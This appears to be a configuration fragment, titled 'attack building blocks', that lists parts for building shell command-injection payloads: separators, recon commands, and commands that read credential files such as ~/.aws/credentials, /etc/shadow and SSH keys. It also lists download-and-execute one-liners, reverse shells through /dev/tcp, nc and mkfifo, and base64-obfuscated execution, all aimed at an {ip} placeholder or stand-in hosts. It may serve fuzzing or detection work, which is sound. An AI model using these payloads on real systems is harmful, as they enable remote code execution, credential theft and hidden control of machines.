# --- attack building blocks ---
cmd_separators: [";", "&&", "||", "|", "\n", "%0a", "`", "$("]
recon_cmds: [id, whoami, uname -a, hostname, cat /etc/passwd, cat /etc/os-release, ls -la /, ps aux, netstat -tulpn,
             ifconfig, ip a, env, pwd, cat /proc/version, ls /home]
cred_cmds: [cat ~/.aws/credentials, cat /etc/shadow, cat .env, cat ~/.ssh/id_rsa, grep -ri password /var/www,
            find / -name "*.kube*" 2>/dev/null, cat /root/.bash_history, printenv]
dl_cmds: ["wget http://{ip}/x.sh -O /tmp/x.sh", "curl -s http://{ip}/s | sh", "curl http://{ip}:8000/a.sh | bash",
          "busybox wget http://{ip}/b -O /tmp/b; chmod +x /tmp/b; /tmp/b", "tftp -g -r m {ip}",
          "python3 -c 'import urllib.request;urllib.request.urlretrieve(\"http://{ip}/p\",\"/tmp/p\")'"]
revshell_cmds: ["bash -i >& /dev/tcp/{ip}/4444 0>&1", "nc -e /bin/sh {ip} 9001", "nc {ip} 4444 -e /bin/bash",
                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} 1234 >/tmp/f",
                "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",4242))'"]
obf_cmds: ["echo {b64} | base64 -d | sh", "echo {b64}|base64 -d|bash", "eval $(echo {b64} | base64 -d)",
           "printf '\\x69\\x64' | sh", "$(echo aWQ= | base64 -d)"]
# Generic shell verbs + args, combined at random (the "misc" command group).
shell_verbs: [ls, cat, head, tail, touch, rm -f, mkdir -p, cp, mv, chmod +x, chmod 777, kill -9, sleep, ping -c 3,
              nslookup, dig, host, tar czf, zip -r, crontab -l, sh -c, perl -e, php -r, ruby -e, echo, tee, uname -r,
              df -h, mount, sudo -l, getent passwd, last, w, lsof -i, ss -tunap]
shell_args: [/tmp/x, /etc/hosts, /var/www, /home/deploy, ~/.bashrc, "1", "10", attacker.test, evil.example, "'print 1'",
             /tmp/a.tgz /home, "pwned > /tmp/p", /etc/crontab, /root, /var/log/syslog]
